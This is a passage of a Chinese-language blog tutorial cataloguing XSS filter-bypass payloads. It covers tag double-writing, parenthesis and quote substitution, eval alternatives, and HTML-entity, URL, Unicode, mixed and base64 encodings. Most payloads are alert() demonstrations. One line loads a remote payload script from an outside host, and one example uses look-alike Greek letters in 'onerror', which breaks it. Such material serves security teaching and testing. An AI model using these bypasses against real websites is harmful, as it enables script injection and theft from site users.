替换为空（如果替换为其他字符，双写绕过也没用）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;scrscriptipt&gt;</span><span class="hljs-attribute">alert</span>(<span class="hljs-number">1</span>)&lt;/scrscriptipt&gt;<br></code></pre></td></tr></table></figure><h2 id="圆括号过滤绕过"><a href="#圆括号过滤绕过" class="headerlink" title="圆括号过滤绕过"></a>圆括号过滤绕过</h2><p>若 <code>alert(1)</code> 函数中的 <code>()</code> 被过滤了，可以考虑使用下面的方式进行绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 反引号替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- throw 绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span>    <br></code></pre></td></tr></table></figure><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><p>有时候空格会被过滤，这里我们可以使用回车的url编码进行绕过</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">0</span>Aοnerrοr<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="alert-过滤绕过"><a href="#alert-过滤绕过" class="headerlink" title="alert 过滤绕过"></a>alert 过滤绕过</h2><p>有时页面会过滤掉alert函数，不使用<code>alert</code>就行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--弹出输入框--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!--弹出提示框--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>confirm(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!--远程加载payload--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;//www.ldlx.com/xss/xss_payload.php?payload=2&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h2><p>若 <code>alert(&#39;xss&#39;)</code> 中的 <code>&#39;&#39;</code> 被过滤了，可以考虑使用下面的方式进行绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 斜杠替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 反引号替换 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">`xss`</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="a标签href属性javascript伪协议绕过"><a href="#a标签href属性javascript伪协议绕过" class="headerlink" title="a标签href属性javascript伪协议绕过"></a>a标签href属性javascript伪协议绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="eval过滤绕过"><a href="#eval过滤绕过" class="headerlink" title="eval过滤绕过"></a>eval过滤绕过</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>编码绕过<br> 浏览器对 XSS 代码的解析顺序为：HTML解码 —— URL解码 —— JS解码(只支持UNICODE)。</p><h3 id="html-实体编码"><a href="#html-实体编码" class="headerlink" title="html 实体编码"></a>html 实体编码</h3><p>当可控点为单个标签属性时，可以使用 html 实体编码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;<br><br>&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;<br>&lt;img src=x onerror=&quot;可控点&quot;&gt;<br>Payload<br><br>&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;<br>十进制<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span>106;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>118;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>115;&amp;<span class="hljs-punctuation">#</span>99;&amp;<span class="hljs-punctuation">#</span>114;&amp;<span class="hljs-punctuation">#</span>105;&amp;<span class="hljs-punctuation">#</span>112;&amp;<span class="hljs-punctuation">#</span>116;&amp;<span class="hljs-punctuation">#</span>58;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>108;&amp;<span class="hljs-punctuation">#</span>101;&amp;<span class="hljs-punctuation">#</span>114;&amp;<span class="hljs-punctuation">#</span>116;&amp;<span class="hljs-punctuation">#</span>40;&amp;<span class="hljs-punctuation">#</span>49;&amp;<span class="hljs-punctuation">#</span>41;&quot;&gt;test&lt;/a&gt;<br>十六进制<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6a</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x76</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x73</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x63</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x69</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x70</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x3a</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6c</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x65</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x28</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x31</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x29</span>;&quot;&gt;test&lt;/a&gt;<br><br><br>可以不带分号<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x76</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x73</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x63</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x69</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x70</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x3a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6c</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x65</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x28</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x31</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x29</span>&quot;&gt;test&lt;/a&gt;<br><br><br>可以填充0<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x006a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0076</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0073</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0063</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0072</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0069</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0070</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0074</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x003a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x006c</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0065</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0072</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0074</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0028</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0031</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0029</span>&quot;&gt;test&lt;/a&gt;<br><br></code></pre></td></tr></table></figure><h3 id="url-编码"><a href="#url-编码" class="headerlink" title="url 编码"></a>url 编码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">当注入点存在 href 或者 src 属性时，可以使用 url 编码。<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><br>Payload<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>可以二次编码<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="js-编码"><a href="#js-编码" class="headerlink" title="js 编码"></a>js 编码</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">payload</span><br><br><span class="hljs-operator">&lt;</span><span class="hljs-variable">img</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-variable">x</span> <span class="hljs-variable">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(1)&quot;</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-operator">&lt;</span>input <span class="hljs-variable">onfocus</span><span class="hljs-operator">=</span><span class="hljs-variable">location</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-variable">autofocus</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-title class_">Unicode</span> 编码<br><br><span class="hljs-operator">&lt;</span><span class="hljs-variable">img</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-variable">x</span> <span class="hljs-variable">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\u0061</span>\u006c<span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0072</span><span class="hljs-char escape_">\u0074</span>(1)&quot;</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-operator">&lt;</span>input <span class="hljs-variable">onfocus</span><span class="hljs-operator">=</span><span class="hljs-variable">location</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript:<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u006C</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0072</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0028</span><span class="hljs-char escape_">\u0031</span><span class="hljs-char escape_">\u0029</span>&quot;</span> <span class="hljs-variable">autofocus</span><span class="hljs-operator">&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h3><p>浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xquery">原代码<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br>对alert进行JS编码（unicode编码）<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br><br>对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br>对href标签中的javascript:<span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%63</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%32</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span>(<span class="hljs-number">1</span>)进行HTML编码：<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x3a;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x32;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x34;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h3><p>base64 编码通常需要使用到 data 伪协议。</p><p>data 协议使用方法：data:资源类型;编码,内容</p><p>base64编码内容为：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span 